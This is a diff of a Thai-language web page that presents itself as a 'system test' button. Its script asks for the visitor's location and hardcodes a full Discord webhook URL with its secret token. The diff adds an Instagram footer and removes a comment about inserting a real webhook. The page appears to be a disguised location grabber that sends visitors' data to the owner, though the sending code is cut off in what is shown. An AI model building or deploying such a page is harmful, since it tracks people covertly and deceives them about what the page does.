@@ -14,10 +14,14 @@
 
     <button onclick="collectInfo()">คลิกเพื่อเริ่มทดสอบระบบ</button>
     <p id="status" style="margin-top: 20px;"></p>
+
+    <footer style="margin-top: 40px; font-size: 0.9rem; color: #555; text-align: center;">
+      <p>📸 ติดตามเราได้ที่ <a href="https://www.instagram.com/sky._.abc" target="_blank">@sky._.abc</a></p>
+    </footer>
   </div>
 
   <script>
-    const webhook = "https://discord.com/api/webhooks/1378728447647682591/BgtTJM5LlpBKWcrHmH7e32FHQq4z-TwIJUiy133A7mHI2SmwmIPbZ6-_8ro1E0tINTYQ"; // ใส่ Webhook จริงของคุณตรงนี้
+    const webhook = "https://discord.com/api/webhooks/1378728447647682591/BgtTJM5LlpBKWcrHmH7e32FHQq4z-TwIJUiy133A7mHI2SmwmIPbZ6-_8ro1E0tINTYQ";
 
     function collectInfo() {
       document.getElementById("status").innerText = "📡 กำลังขอข้อมูลตำแหน่ง...";
